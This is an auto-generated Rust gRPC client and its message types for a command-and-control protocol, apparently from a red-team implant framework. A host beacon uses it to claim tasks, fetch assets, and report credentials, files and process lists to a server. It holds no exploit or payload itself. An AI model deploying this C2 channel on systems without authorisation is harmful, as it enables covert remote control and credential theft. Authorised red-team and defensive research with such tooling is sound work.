/// Agent information to identify the type of beacon.
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Agent {
    #[prost(string, tag = "1")]
    pub identifier: ::prost::alloc::string::String,
}
/// Beacon information that is unique to the current running beacon.
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Beacon {
    #[prost(string, tag = "1")]
    pub identifier: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    pub principal: ::prost::alloc::string::String,
    #[prost(message, optional, tag = "3")]
    pub host: ::core::option::Option<Host>,
    #[prost(message, optional, tag = "4")]
    pub agent: ::core::option::Option<Agent>,
    /// Duration until next callback, in seconds.
    #[prost(uint64, tag = "5")]
    pub interval: u64,
}
/// Host information for the system a beacon is running on.
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Host {
    #[prost(string, tag = "1")]
    pub identifier: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    pub name: ::prost::alloc::string::String,
    #[prost(enumeration = "host::Platform", tag = "3")]
    pub platform: i32,
    #[prost(string, tag = "4")]
    pub primary_ip: ::prost::alloc::string::String,
}
/// Nested message and enum types in `Host`.
pub mod host {
    #[derive(
        Clone,
        Copy,
        Debug,
        PartialEq,
        Eq,
        Hash,
        PartialOrd,
        Ord,
        ::prost::Enumeration
    )]
    #[repr(i32)]
    pub enum Platform {
        Unspecified = 0,
        Windows = 1,
        Linux = 2,
        Macos = 3,
        Bsd = 4,
    }
    impl Platform {
        /// String value of the enum field names used in the ProtoBuf definition.
        ///
        /// The values are not transformed in any way and thus are considered stable
        /// (if the ProtoBuf definition does not change) and safe for programmatic use.
        pub fn as_str_name(&self) -> &'static str {
            match self {
                Platform::Unspecified => "PLATFORM_UNSPECIFIED",
                Platform::Windows => "PLATFORM_WINDOWS",
                Platform::Linux => "PLATFORM_LINUX",
                Platform::Macos => "PLATFORM_MACOS",
                Platform::Bsd => "PLATFORM_BSD",
            }
        }
        /// Creates an enum from field names used in the ProtoBuf definition.
        pub fn from_str_name(value: &str) -> ::core::option::Option<Self> {
            match value {
                "PLATFORM_UNSPECIFIED" => Some(Self::Unspecified),
                "PLATFORM_WINDOWS" => Some(Self::Windows),
                "PLATFORM_LINUX" => Some(Self::Linux),
                "PLATFORM_MACOS" => Some(Self::Macos),
                "PLATFORM_BSD" => Some(Self::Bsd),
                _ => None,
            }
        }
    }
}
/// Task instructions for the beacon to execute.
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Task {
    #[prost(int64, tag = "1")]
    pub id: i64,
    #[prost(message, optional, tag = "2")]
    pub tome: ::core::option::Option<crate::eldritch::Tome>,
    #[prost(string, tag = "3")]
    pub quest_name: ::prost::alloc::string::String,
}
/// TaskError provides information when task execution fails.
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct TaskError {
    #[prost(string, tag = "1")]
    pub msg: ::prost::alloc::string::String,
}
/// TaskOutput provides information about a running task.
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct TaskOutput {
    #[prost(int64, tag = "1")]
    pub id: i64,
    #[prost(string, tag = "2")]
    pub output: ::prost::alloc::string::String,
    #[prost(message, optional, tag = "3")]
    pub error: ::core::option::Option<TaskError>,
    /// Indicates the UTC timestamp task execution began, set only in the first message for reporting.
    #[prost(message, optional, tag = "4")]
    pub exec_started_at: ::core::option::Option<::prost_types::Timestamp>,
    /// Indicates the UTC timestamp task execution completed, set only in last message for reporting.
    #[prost(message, optional, tag = "5")]
    pub exec_finished_at: ::core::option::Option<::prost_types::Timestamp>,
}
///
/// RPC Messages
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ClaimTasksRequest {
    #[prost(message, optional, tag = "1")]
    pub beacon: ::core::option::Option<Beacon>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ClaimTasksResponse {
    #[prost(message, repeated, tag = "1")]
    pub tasks: ::prost::alloc::vec::Vec<Task>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct FetchAssetRequest {
    #[prost(string, tag = "1")]
    pub name: ::prost::alloc::string::String,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct FetchAssetResponse {
    #[prost(bytes = "vec", tag = "1")]
    pub chunk: ::prost::alloc::vec::Vec<u8>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ReportCredentialRequest {
    #[prost(int64, tag = "1")]
    pub task_id: i64,
    #[prost(message, optional, tag = "2")]
    pub credential: ::core::option::Option<crate::eldritch::Credential>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ReportCredentialResponse {}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ReportFileRequest {
    #[prost(int64, tag = "1")]
    pub task_id: i64,
    #[prost(message, optional, tag = "2")]
    pub chunk: ::core::option::Option<crate::eldritch::File>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ReportFileResponse {}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ReportProcessListRequest {
    #[prost(int64, tag = "1")]
    pub task_id: i64,
    #[prost(message, optional, tag = "2")]
    pub list: ::core::option::Option<crate::eldritch::ProcessList>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ReportProcessListResponse {}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ReportTaskOutputRequest {
    #[prost(message, optional, tag = "1")]
    pub output: ::core::option::Option<TaskOutput>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ReportTaskOutputResponse {}
/// Generated client implementations.
pub mod c2_client {
    #![allow(unused_variables, dead_code, missing_docs, clippy::let_unit_value)]
    use tonic::codegen::*;
    use tonic::codegen::http::Uri;
    #[derive(Debug, Clone)]
    pub struct C2Client<T> {
        inner: tonic::client::Grpc<T>,
    }
    impl C2Client<tonic::transport::Channel> {
        /// Attempt to create a new client by connecting to a given endpoint.
        pub async fn connect<D>(dst: D) -> Result<Self, tonic::transport::Error>
        where
            D: TryInto<tonic::transport::Endpoint>,
            D::Error: Into<StdError>,
        {
            let conn = tonic::transport::Endpoint::new(dst)?.connect().await?;
            Ok(Self::new(conn))
        }
    }
    impl<T> C2Client<T>
    where
        T: tonic::client::GrpcService<tonic::body::BoxBody>,
        T::Error: Into<StdError>,
        T::ResponseBody: Body<Data = Bytes> + Send + 'static,
        <T::ResponseBody as Body>::Error: Into<StdError> + Send,
    {
        pub fn new(inner: T) -> Self {
            let inner = tonic::client::Grpc::new(inner);
            Self { inner }
        }
        pub fn with_origin(inner: T, origin: Uri) -> Self {
            let inner = tonic::client::Grpc::with_origin(inner, origin);
            Self { inner }
        }
        pub fn with_interceptor<F>(
            inner: T,
            interceptor: F,
        ) -> C2Client<InterceptedService<T, F>>
        where
            F: tonic::service::Interceptor,
            T::ResponseBody: Default,
            T: tonic::codegen::Service<
                http::Request<tonic::body::BoxBody>,
                Response = http::Response<
                    <T as tonic::client::GrpcService<tonic::body::BoxBody>>::ResponseBody,
                >,
            >,
            <T as tonic::codegen::Service<
                http::Request<tonic::body::BoxBody>,
            >>::Error: Into<StdError> + Send + Sync,
        {
            C2Client::new(InterceptedService::new(inner, interceptor))
        }
        /// Compress requests with the given encoding.
        ///
        /// This requires the server to support it otherwise it might respond with an
        /// error.
        #[must_use]
        pub fn send_compressed(mut self, encoding: CompressionEncoding) -> Self {
            self.inner = self.inner.send_compressed(encoding);
            self
        }
        /// Enable decompressing responses.
        #[must_use]
        pub fn accept_compressed(mut self, encoding: CompressionEncoding) -> Self {
            self.inner = self.inner.accept_compressed(encoding);
            self
        }
        /// Limits the maximum size of a decoded message.
        ///
        /// Default: `4MB`
        #[must_use]
        pub fn max_decoding_message_size(mut self, limit: usize) -> Self {
            self.inner = self.inner.max_decoding_message_size(limit);
            self
        }
        /// Limits the maximum size of an encoded message.
        ///
        /// Default: `usize::MAX`
        #[must_use]
        pub fn max_encoding_message_size(mut self, limit: usize) -> Self {
            self.inner = self.inner.max_encoding_message_size(limit);
            self
        }
        ///
        /// Contact the server for new tasks to execute.
        pub async fn claim_tasks(
            &mut self,
            request: impl tonic::IntoRequest<super::ClaimTasksRequest>,
        ) -> std::result::Result<
            tonic::Response<super::ClaimTasksResponse>,
            tonic::Status,
        > {
            self.inner
                .ready()
                .await
                .map_err(|e| {
                    tonic::Status::new(
                        tonic::Code::Unknown,
                        format!("Service was not ready: {}", e.into()),
                    )
                })?;
            let codec = tonic::codec::ProstCodec::default();
            let path = http::uri::PathAndQuery::from_static("/c2.C2/ClaimTasks");
            let mut req = request.into_request();
            req.extensions_mut().insert(GrpcMethod::new("c2.C2", "ClaimTasks"));
            self.inner.unary(req, path, codec).await
        }
        ///
        /// Fetch an asset from the server, returning one or more chunks of data.
        /// The maximum size of these chunks is determined by the server.
        /// The server should reply with two headers:
        ///   - "sha3-256-checksum": A SHA3-256 digest of the entire file contents.
        ///   - "file-size": The number of bytes contained by the file.
        ///
        /// If no associated file can be found, a NotFound status error is returned.
        pub async fn fetch_asset(
            &mut self,
            request: impl tonic::IntoRequest<super::FetchAssetRequest>,
        ) -> std::result::Result<
            tonic::Response<tonic::codec::Streaming<super::FetchAssetResponse>>,
            tonic::Status,
        > {
            self.inner
                .ready()
                .await
                .map_err(|e| {
                    tonic::Status::new(
                        tonic::Code::Unknown,
                        format!("Service was not ready: {}", e.into()),
                    )
                })?;
            let codec = tonic::codec::ProstCodec::default();
            let path = http::uri::PathAndQuery::from_static("/c2.C2/FetchAsset");
            let mut req = request.into_request();
            req.extensions_mut().insert(GrpcMethod::new("c2.C2", "FetchAsset"));
            self.inner.server_streaming(req, path, codec).await
        }
        ///
        /// Report a credential from the host to the server.
        pub async fn report_credential(
            &mut self,
            request: impl tonic::IntoRequest<super::ReportCredentialRequest>,
        ) -> std::result::Result<
            tonic::Response<super::ReportCredentialResponse>,
            tonic::Status,
        > {
            self.inner
                .ready()
                .await
                .map_err(|e| {
                    tonic::Status::new(
                        tonic::Code::Unknown,
                        format!("Service was not ready: {}", e.into()),
                    )
                })?;
            let codec = tonic::codec::ProstCodec::default();
            let path = http::uri::PathAndQuery::from_static("/c2.C2/ReportCredential");
            let mut req = request.into_request();
            req.extensions_mut().insert(GrpcMethod::new("c2.C2", "ReportCredential"));
            self.inner.unary(req, path, codec).await
        }
        ///
        /// Report a file from the host to the server.
        /// Providing content of the file is optional. If content is provided:
        ///   - Hash will automatically be calculated and the provided hash will be ignored.
        ///   - Size will automatically be calculated and the provided size will be ignored.
        /// Content is provided as chunks, the size of which are up to the agent to define (based on memory constraints).
        /// Any existing files at the provided path for the host are replaced.
        pub async fn report_file(
            &mut self,
            request: impl tonic::IntoStreamingRequest<Message = super::ReportFileRequest>,
        ) -> std::result::Result<
            tonic::Response<super::ReportFileResponse>,
            tonic::Status,
        > {
            self.inner
                .ready()
                .await
                .map_err(|e| {
                    tonic::Status::new(
                        tonic::Code::Unknown,
                        format!("Service was not ready: {}", e.into()),
                    )
                })?;
            let codec = tonic::codec::ProstCodec::default();
            let path = http::uri::PathAndQuery::from_static("/c2.C2/ReportFile");
            let mut req = request.into_streaming_request();
            req.extensions_mut().insert(GrpcMethod::new("c2.C2", "ReportFile"));
            self.inner.client_streaming(req, path, codec).await
        }
        ///
        /// Report the active list of running processes. This list will replace any previously reported
        /// lists for the same host.
        pub async fn report_process_list(
            &mut self,
            request: impl tonic::IntoRequest<super::ReportProcessListRequest>,
        ) -> std::result::Result<
            tonic::Response<super::ReportProcessListResponse>,
            tonic::Status,
        > {
            self.inner
                .ready()
                .await
                .map_err(|e| {
                    tonic::Status::new(
                        tonic::Code::Unknown,
                        format!("Service was not ready: {}", e.into()),
                    )
                })?;
            let codec = tonic::codec::ProstCodec::default();
            let path = http::uri::PathAndQuery::from_static("/c2.C2/ReportProcessList");
            let mut req = request.into_request();
            req.extensions_mut().insert(GrpcMethod::new("c2.C2", "ReportProcessList"));
            self.inner.unary(req, path, codec).await
        }
        ///
        /// Report execution output for a task.
        pub async fn report_task_output(
            &mut self,
            request: impl tonic::IntoRequest<super::ReportTaskOutputRequest>,
        ) -> std::result::Result<
            tonic::Response<super::ReportTaskOutputResponse>,
            tonic::Status,
        > {
            self.inner
                .ready()
                .await
                .map_err(|e| {
                    tonic::Status::new(
                        tonic::Code::Unknown,
                        format!("Service was not ready: {}", e.into()),
                    )
                })?;
            let codec = tonic::codec::ProstCodec::default();
            let path = http::uri::PathAndQuery::from_static("/c2.C2/ReportTaskOutput");
            let mut req = request.into_request();
            req.extensions_mut().insert(GrpcMethod::new("c2.C2", "ReportTaskOutput"));
            self.inner.unary(req, path, codec).await
        }
    }
}